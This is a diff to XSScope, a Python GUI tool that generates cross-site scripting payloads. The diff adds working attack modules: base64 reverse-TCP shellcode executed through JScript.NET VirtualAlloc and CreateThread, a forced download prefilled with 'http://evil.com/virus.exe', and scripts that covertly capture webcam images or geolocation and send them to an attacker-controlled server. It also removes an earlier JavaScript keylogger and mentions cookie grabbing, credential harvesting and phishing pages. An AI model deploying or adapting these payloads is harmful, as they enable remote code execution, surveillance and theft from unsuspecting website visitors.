@@ -66,7 +66,7 @@ def about():
 def agent_module():
     root1 = tk.Toplevel()
     root1.title("XSScope - XSS Agent Module")
-    root1.geometry('730x400')
+    root1.geometry('1045x410')
     #root1.iconbitmap('x_logo_VYw_icon.ico')
     root1.resizable(0,0)
 
@@ -77,8 +77,10 @@ def agent_module():
     xss_changelinks_var = tk.IntVar()
     xss_changeimages_var = tk.IntVar()
     xss_clickjacker_var = tk.IntVar()
-    xss_keyloggerjs_var = tk.IntVar()
     xss_webcam_var = tk.IntVar()
+    xss_net_shell_var = tk.IntVar()
+    xss_force_download_var = tk.IntVar()
+    xss_geolocation_var = tk.IntVar()
 
     def print_help():
         network_explaination_text = """XSScope generates automatically Ngrok TCP server for port forwarding, if you want to use your custom IP/DNS and Port please take a look at this short explaination: 
@@ -98,6 +100,26 @@ http://canyouseeme.org
             changelinks_entry.delete(0, END)
             changelinks_text.config(state="disabled")
             changelinks_entry.config(state="disabled")
+
+    def net_shell_function():
+        if xss_net_shell_var.get() == 1:
+            net_shell_exec_label.config(state="normal")
+            net_shell_command.config(state="normal")
+            net_shell_command.insert(END, '''/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgSItyUE0xyUgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBQi0gYSQHQ41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcCgCASUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V''')
+        elif xss_net_shell_var.get() == 0:
+            net_shell_command.delete(0, END)
+            net_shell_exec_label.config(state="disabled")
+            net_shell_command.config(state="disabled")
+
+    def force_download_function():
+        if xss_force_download_var.get() == 1:
+            force_download_label.config(state="normal")
+            force_download_url.config(state="normal")
+            force_download_url.insert(END, 'http://evil.com/virus.exe')
+        elif xss_force_download_var.get() == 0:
+            force_download_url.delete(0, END)
+            force_download_label.config(state="disabled")
+            force_download_url.config(state="disabled")
 
     def clickjack_function():
         if xss_clickjacker_var.get() == 1:
@@ -166,6 +188,136 @@ http://canyouseeme.org
 
 '''
 
+        net_shell_code = """import System;
+import System.Runtime.InteropServices;
+import System.Reflection;
+import System.Reflection.Emit;
+import System.Runtime;
+import System.Text;
+ 
+//C:\Windows\Microsoft.NET\Framework\v2.0.50727\jsc.exe Shellcode.js
+//C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe Shellcode.js
+ 
+function InvokeWin32(dllName:String, returnType:Type,
+  methodName:String, parameterTypes:Type[], parameters:Object[])
+{
+  // Begin to build the dynamic assembly
+  var domain = AppDomain.CurrentDomain;
+  var name = new System.Reflection.AssemblyName('PInvokeAssembly');
+  var assembly = domain.DefineDynamicAssembly(name, AssemblyBuilderAccess.Run);
+  var module = assembly.DefineDynamicModule('PInvokeModule');
+  var type = module.DefineType('PInvokeType',TypeAttributes.Public + TypeAttributes.BeforeFieldInit);
+ 
+  // Define the actual P/Invoke method
+  var method = type.DefineMethod(methodName, MethodAttributes.Public + MethodAttributes.HideBySig + MethodAttributes.Static + MethodAttributes.PinvokeImpl, returnType, parameterTypes);
+ 
+  // Apply the P/Invoke constructor
+  var ctor = System.Runtime.InteropServices.DllImportAttribute.GetConstructor([Type.GetType("System.String")]);
+  var attr = new System.Reflection.Emit.CustomAttributeBuilder(ctor, [dllName]);
+  method.SetCustomAttribute(attr);
+ 
+  // Create the temporary type, and invoke the method.
+  var realType = type.CreateType();
+  return realType.InvokeMember(methodName, BindingFlags.Public + BindingFlags.Static + BindingFlags.InvokeMethod, null, null, parameters);
+}
+ 
+function VirtualAlloc( lpStartAddr:UInt32, size:UInt32, flAllocationType:UInt32, flProtect:UInt32)
+{
+var parameterTypes:Type[] = [Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.UInt32")];
+var parameters:Object[] = [lpStartAddr, size, flAllocationType, flProtect];
+
+return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "VirtualAlloc", parameterTypes,  parameters );
+}
+
+function CreateThread( lpThreadAttributes:UInt32, dwStackSize:UInt32, lpStartAddress:IntPtr, param:IntPtr, dwCreationFlags:UInt32, lpThreadId:UInt32)
+{
+var parameterTypes:Type[] = [Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.IntPtr"),Type.GetType("System.IntPtr"), Type.GetType("System.UInt32"), Type.GetType("System.UInt32") ];
+var parameters:Object[] = [lpThreadAttributes, dwStackSize, lpStartAddress, param, dwCreationFlags, lpThreadId ];
+
+return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "CreateThread", parameterTypes,  parameters );
+}
+
+function WaitForSingleObject( handle:IntPtr, dwMiliseconds:UInt32)
+{
+var parameterTypes:Type[] = [Type.GetType("System.IntPtr"),Type.GetType("System.UInt32")];
+var parameters:Object[] = [handle, dwMiliseconds ];
+
+return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "WaitForSingleObject", parameterTypes,  parameters );
+}
+
+function ShellCodeExec()
+{
+var MEM_COMMIT:uint = 0x1000;
+var PAGE_EXECUTE_READWRITE:uint = 0x40;
+
+var shellcodestr:String = '""" + str(net_shell_command.get()) + """';
+var shellcode:Byte[] = System.Convert.FromBase64String(shellcodestr);
+var funcAddr:IntPtr = VirtualAlloc(0, UInt32(shellcode.Length),MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
+var hThread:IntPtr = IntPtr.Zero;
+var threadId:UInt32 = 0;
+// prepare data
+var pinfo:IntPtr = IntPtr.Zero;
+// execute native code
+hThread = CreateThread(0, 0, funcAddr, pinfo, 0, threadId);
+WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+}
+
+ShellCodeExec();
+
+"""
+
+        webcam_code = '''if (document.getElementById('webcamsnap') == null){ 
+ 
+	 var v = document.createElement('video');
+      v.autoplay=true;
+	  v.id='vid';
+	  v.style.display='none';
+	  document.body.appendChild(v); 
+     if (document.getElementById('canvas') == null) {
+    var c = document.createElement('canvas');
+    c.id = 'canvas';
+    c.width = "480";
+    c.height = "320";
+    c.style.display = "none";
+    document.body.appendChild(c);
+}
+var video = document.querySelector("#vid");
+var canvas = document.querySelector('#canvas');
+var ctx = canvas.getContext('2d');
+var localMediaStream = null;
+var onCameraFail = function (e) {
+    console.log('Camera is not working.', e);
+};
+var xmlhttp=new XMLHttpRequest();
+
+function snapshot() {
+    if (localMediaStream) {
+        ctx.drawImage(video, 0, 0, 480, 320);
+        var dat = canvas.toDataURL('image/png');
+        xmlhttp.open("POST", "http://''' + tcp_server + '''/webcam.php", true);
+        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    	var x=encodeURIComponent(dat);
+        xmlhttp.send("data=" + x);
+       
+    }
+    else {
+        alert("Allow access to your default web camera.");
+    }
+    }
+
+navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
+window.URL = window.URL || window.webkitURL;
+navigator.getUserMedia({video:true}, function (stream) {
+    video.srcObject = stream
+    localMediaStream = stream;
+    window.setInterval("snapshot()", ''' + str(xss_webcam_interval.get()) + ''');
+}, onCameraFail);script = document.createElement('script');script.id = 'webcamsnap'; document.body.appendChild(script); }
+        
+'''
+
         xhr_harverster_code = '''username = document.forms[0].elements[0].value;
 password = document.forms[0].elements[1].value;
 window.setTimeout(function(){ 
@@ -203,111 +355,38 @@ document.body.addEventListener('click', catchClick, true);
 
 '''
 
-        webcam_code = """
-<head>
-<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-</head>
+        geolocation_code = '''if (document.getElementById('xss_geoloc') == null){ 
+function sendXHR(data)
+{
+        var xmlhttp= new XMLHttpRequest();
+		xmlhttp.open("POST","http://''' + tcp_server + '''/retriever.php",true);
+        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        xmlhttp.send("xsscope_geo="+data);
+}
+function showPosition(position) {
 
-<div class="video-wrap" hidden="hidden">
-   <video id="video" playsinline autoplay></video>
-</div>
-
-<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
-
-<script>
-
-function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'http://""" + tcp_server + """/webcam.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
+var map ='http://maps.googleapis.com/maps/api/staticmap?center='+ position.coords.latitude+','+position.coords.longitude+'&zoom=14&size=600x400&sensor=false';
+sendXHR(encodeURIComponent(map));
+   
+}
+if (navigator.geolocation) 
+	{
+        navigator.geolocation.getCurrentPosition(showPosition);
+    } else 
+	{ 
+        sendXHR("Geolocation is not supported by this browser.");
     }
-  });
-};
 
-'use strict';
+script = document.createElement('script');script.id = 'xss_geoloc'; document.body.appendChild(script); }
+        
+'''
 
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
-
-const constraints = {
-  audio: false,
-  video: {
-    
-    facingMode: "user"
-  }
-};
-
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
-}
-
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
-
-var context = canvas.getContext('2d');
-  setInterval(function(){
-
-       context.drawImage(video, 0, 0, 640, 480);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, """+ str(xss_webcam_interval.get()) + """);
-  
-}
-init();
-</script>
-"""
-
-        keyloggerjs_code = """<script>
-var buffer = [];
-var url = 'http://""" + tcp_server + """/retriever.php?xsscope='
-
-document.onkeypress = function(e) {
-  get = window.event?event:e;
-  buff = get.keyCode?get.keyCode:get.charCode;
-  buff = String.fromCharCode(buff);
-  buffer+=buff;
-}
-
-var imgArray = new Array();
-var myVar;
-
-function myFunction() {
-  myVar = setInterval(every1sec, 1);
-}
-
-function every1sec() { 
- 
-     if (buffer.length > 0) {
-        var data = decodeURIComponent(JSON.stringify(buffer));
-
-        imgArray[0] = new Image();
-        imgArray[0].src = url + data;
-
-        new Image().src = buffer;
-        buffer = [];
-      }
-
-}
-
-myFunction()
-</script>
+        force_download_code="""var link = document.createElement('a');
+link.href = '""" + str(force_download_url.get()) + """';
+link.download = '';
+document.body.appendChild(link);
+link.click();
+        
 """
 
         #start checking every checkbox and generating payload based on the user's preference
@@ -340,6 +419,22 @@ myFunction()
                 html_file.append(clickjacker_code)
             else:
                 pass
+            if xss_webcam_var.get() == 1:
+                html_file.append(webcam_code)
+            else:
+                pass
+            if xss_geolocation_var.get() == 1:
+                html_file.append(geolocation_code)
+            else:
+                pass
+            if xss_force_download_var.get() == 1:
+                html_file.append(force_download_code)
+            else:
+                pass
+            if xss_net_shell_var.get() == 1:
+                html_file.append(net_shell_code)
+            else:
+                pass
 
             #generating xsscope.js
             jsfile = open("xsscope.js", "w")
@@ -355,59 +450,6 @@ myFunction()
         except:
             loading_bar['value'] = 100
             root1.update_idletasks()
-
-        #generating an .html payload if one of the two checkboxes is checked.
-        loading_bar['value'] = 0
-        root1.update_idletasks()
-
-        html_file1 = []
-        if xss_webcam_var.get() == 1 or xss_keyloggerjs_var.get() == 1:
-            try:
-                if xss_webcam_var.get() == 1:
-                    html_file1.append(webcam_code)
-                else:
-                    pass
-                if xss_keyloggerjs_var.get() == 1:
-                    html_file1.append(keyloggerjs_code)
-
-                built_payload = tkinter.filedialog.asksaveasfile(mode='w', defaultextension=".html")
-                if built_payload is None:  # asksaveasfile return `None` if dialog closed with "cancel".
-                    return
-
-                built_payload.write("<!doctype html>\n")
-                built_payload.write("<html>\n")
-                for script_code1 in html_file1:
-                    built_payload.write(script_code1)
-                built_payload.write("\n</html>")
-                built_payload.close()
-
-                loading_bar['value'] = 100
-                root1.update_idletasks()
-
-            except:
-                loading_bar['value'] = 100
-                root1.update_idletasks()
-
-        loading_bar['value'] = 100
-        root1.update_idletasks()
-        tkinter.messagebox.showinfo("Info", "Payload successfuly built.")
-
-    # HTML Frame Module
-    root4_frame = LabelFrame(root1, text="HTML Module Frame (will export as .html)")
-    root4_frame.place(x=5, y=260)
-
-    xss_webcam = tk.Checkbutton(root4_frame, text="Persistent webcam hijacking. (requires permission)                             ",
-                                variable=xss_webcam_var, command=refresh_webcam_status)
-    xss_webcam.grid(row=0, column=0)
-
-    xss_webcam_interval_text = tk.Label(root4_frame, text="Capture Interval (ms): ", state="disabled")
-    xss_webcam_interval_text.grid(row=0, column=1)
-
-    xss_webcam_interval = tk.Entry(root4_frame, width=10, state="disabled")
-    xss_webcam_interval.grid(row=0, column=2)
-
-    xss_keyloggerjs = tk.Checkbutton(root4_frame, text="Keyboard spying (js active keylogger)                                                   ",variable=xss_keyloggerjs_var)
-    xss_keyloggerjs.grid(row=1, column=0)
 
     #network settings frame root1_frame
     root1_frame = LabelFrame(root1, text="Network Settings")
@@ -440,21 +482,55 @@ myFunction()
     root2_frame = LabelFrame(root1, text="XSS Module Frame")
     root2_frame.place(x=5, y=55)
 
-    xss_keylogger = tk.Checkbutton(root2_frame, text="Keyboard spying (active keylogger)                                                                                                                  ", variable=xss_keylogger_var)
+    xss_keylogger = tk.Checkbutton(root2_frame, text="Keyboard spying (active keylogger)                                                                         ", variable=xss_keylogger_var)
     xss_keylogger.grid(row=1, column=0)
 
-    xss_screenshot = tk.Checkbutton(root2_frame, text="Take screenshot on victim's browser                                                                                                                 ", variable=xss_screenshot_var)
+    xss_screenshot = tk.Checkbutton(root2_frame, text="Take screenshot on victim's browser                                                                       ", variable=xss_screenshot_var)
     xss_screenshot.grid(row=2, column=0)
 
-    xss_xhr_harvester = tk.Checkbutton(root2_frame, text="Monitor every Entry form in the website                                                                                                           ", variable=xss_xhr_harvester_var)
+    xss_xhr_harvester = tk.Checkbutton(root2_frame, text="Get victim's saved credentials on the website                                                        ", variable=xss_xhr_harvester_var)
     xss_xhr_harvester.grid(row=4, column=0)
 
-    xss_cookie_grabber = tk.Checkbutton(root2_frame, text="Grab the victim cookies (if any)                                                                                                                         ", variable=xss_cookie_grabber_var)
+    xss_cookie_grabber = tk.Checkbutton(root2_frame, text="Grab the victim cookies (if any)                                                                               ", variable=xss_cookie_grabber_var)
     xss_cookie_grabber.grid(row=5, column=0)
 
+    xss_webcam = tk.Checkbutton(root2_frame, text="Persistent webcam hijacking (requires permission)                                                ",variable=xss_webcam_var, command=refresh_webcam_status)
+    xss_webcam.grid(row=6, column=0)
+
+    xss_webcam_interval_text = tk.Label(root2_frame, text="Capture Interval (ms): ", state="disabled")
+    xss_webcam_interval_text.grid(row=6, column=1)
+
+    xss_webcam_interval = tk.Entry(root2_frame, width=10, state="disabled")
+    xss_webcam_interval.grid(row=6, column=2)
+
+    force_download = tk.Checkbutton(root2_frame, text="Force victim to download                                                                                         ", variable=xss_force_download_var, command=force_download_function)
+    force_download.grid(row=7, column=0)
+
+    force_download_label = tk.Label(root2_frame, text="URL of malicious file: ")
+    force_download_label.grid(row=7, column=1)
+    force_download_label.config(state="disabled")
+
+    force_download_url = tk.Entry(root2_frame, width=40)
+    force_download_url.grid(row=7, column=2)
+    force_download_url.config(state="disabled")
+
+    geolocation = tk.Checkbutton(root2_frame, text="Get real-time location                                                                                              ", variable=xss_geolocation_var)
+    geolocation.grid(row=8, column=0)
+
+    net_shell_exec = tk.Checkbutton(root2_frame, text="Execute .NET Shellcode (default: msfvenom base64 encoded reverse_tcp)          ", variable=xss_net_shell_var, command=net_shell_function)
+    net_shell_exec.grid(row=9, column=0)
+
+    net_shell_exec_label = tk.Label(root2_frame, text="Shell code command: ")
+    net_shell_exec_label.grid(row=9, column=1)
+    net_shell_exec_label.config(state="disabled")
+
+    net_shell_command = tk.Entry(root2_frame, width=40)  #<script type="module"  src="http://2.tcp.ngrok.io:16429/NET_shell_exec.js"></script>
+    net_shell_command.grid(row=9, column=2)
+    net_shell_command.config(state="disabled")
+
     #-----------xss modules frames (for fun) inside the main module frame
-    root3_frame = LabelFrame(root2_frame, text="Funny Module Frame")
-    root3_frame.grid(row=6, column=0)
+    root3_frame = LabelFrame(root1, text="Fun Module Frame")
+    root3_frame.place(x=5, y=265)
 
     xss_changelinks = tk.Checkbutton(root3_frame, text="Change every link in the website.         ", variable=xss_changelinks_var, command=changelink_function)
     xss_changelinks.grid(row=0, column=0)
@@ -462,7 +538,7 @@ myFunction()
     changelinks_text = tk.Label(root3_frame, text=" Replaced URL: ", state="disabled")
     changelinks_text.grid(row=0, column=1)
 
-    changelinks_entry = tk.Entry(root3_frame, width=40, state="disabled")
+    changelinks_entry = tk.Entry(root3_frame, width=79, state="disabled")
     changelinks_entry.grid(row=0, column=2)
 
     xss_changeimages = tk.Checkbutton(root3_frame, text="Change every image in the website.     ", variable=xss_changeimages_var, command=image_loader)
@@ -471,7 +547,7 @@ myFunction()
     image_URL_text = tk.Label(root3_frame, text=" Image URL: ", state="disabled")
     image_URL_text.grid(row=1, column=1)
 
-    image_URL_loader = tk.Entry(root3_frame, width=40, state="disabled")
+    image_URL_loader = tk.Entry(root3_frame, width=79, state="disabled")
     image_URL_loader.grid(row=1, column=2)
 
     xss_clickjacker = tk.Checkbutton(root3_frame, text="Trolling clickjacker.                                ", variable=xss_clickjacker_var, command=clickjack_function)
@@ -480,14 +556,14 @@ myFunction()
     URL_redirection_text = tk.Label(root3_frame, text=" Redirect URL: ", state="disabled")
     URL_redirection_text.grid(row=2, column=1)
 
-    URL_redirection = tk.Entry(root3_frame, width=40, state="disabled")
+    URL_redirection = tk.Entry(root3_frame, width=79, state="disabled")
     URL_redirection.grid(row=2, column=2)
 
     #-------Output of the loading bar and button
     root5_frame = LabelFrame(root1, text="")
-    root5_frame.place(x=5, y=335)
+    root5_frame.place(x=5, y=365)
 
-    loading_bar = ttk.Progressbar(root5_frame, orient = HORIZONTAL, length= 570, mode = 'determinate')
+    loading_bar = ttk.Progressbar(root5_frame, orient = HORIZONTAL, length= 885, mode = 'determinate')
     loading_bar.grid(row=0, column=0)
 
     build_payload_button = tk.Button(root5_frame, text="Build the payload", command=xss_build)
@@ -538,7 +614,7 @@ def check_update():
 
 def show_payload():
     root3 = tk.Toplevel()
-    root3.title("XSScope v.1.6 - All XSS Payloads")
+    root3.title("XSScope v.1.7 - All XSS Payloads")
     root3.geometry('750x580')
     #root3.iconbitmap('x_logo_VYw_icon.ico')
     root3.resizable(0, 0)
@@ -587,7 +663,6 @@ def show_payload():
     payload3 = str(payload3_b64.split("b'")[1])
     payload3 = str(payload3[:-1])
     payload3 = str(payload3[:-2])
-
     cloudflare_bypass = "&Tab;" #needed for payload 8
 
     payload1 = '<script src="http://' + tcp_server + '/xsscope.js"></script>'
@@ -734,7 +809,7 @@ def show_payload():
 
 def phishing_website():
     root4 = tk.Toplevel()
-    root4.title("XSScope v.1.6 - Phishing Website Generator")
+    root4.title("XSScope v.1.7 - Phishing Website Generator")
     root4.geometry('1000x1000')
     root4.resizable(0, 0)
     # root4.iconbitmap('x_logo_VYw_icon.ico')
@@ -744,7 +819,7 @@ def phishing_website():
 
     def show_payloads_html():
         root3_html = tk.Toplevel()
-        root3_html.title("XSScope v.1.6 - All XSS Payloads for generated HTML code")
+        root3_html.title("XSScope v.1.7 - All XSS Payloads for generated HTML code")
         root3_html.geometry('750x580')
         # root3_html.iconbitmap('x_logo_VYw_icon.ico')
         root3_html.resizable(0, 0)
@@ -1167,7 +1242,7 @@ def reverse_shell():
 def main():
     #setting up the whole gui properties
     root = tk.Tk()
-    root.title("XSScope v.1.6")
+    root.title("XSScope v.1.7")
     root.geometry('410x100')
     #root.iconbitmap('x_logo_VYw_icon.ico')
     root.resizable(0,0)
